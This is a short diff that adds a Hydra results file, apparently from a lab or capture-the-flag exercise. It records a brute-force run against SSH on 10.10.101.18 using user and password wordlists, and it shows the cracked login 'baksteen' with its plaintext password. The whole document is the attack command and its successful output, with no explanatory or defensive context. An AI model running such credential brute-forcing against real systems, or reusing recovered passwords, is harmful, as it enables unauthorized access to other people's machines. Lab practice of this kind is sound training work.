@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2024-02-18 15:49:38 on 10.10.101.18 ssh (hydra -L ../users.txt -P ../pass.txt -o ssh_pass.txt ssh://10.10.101.18)
+[22][ssh] host: 10.10.101.18   login: baksteen   password: S1ck3nBluff+secureshell
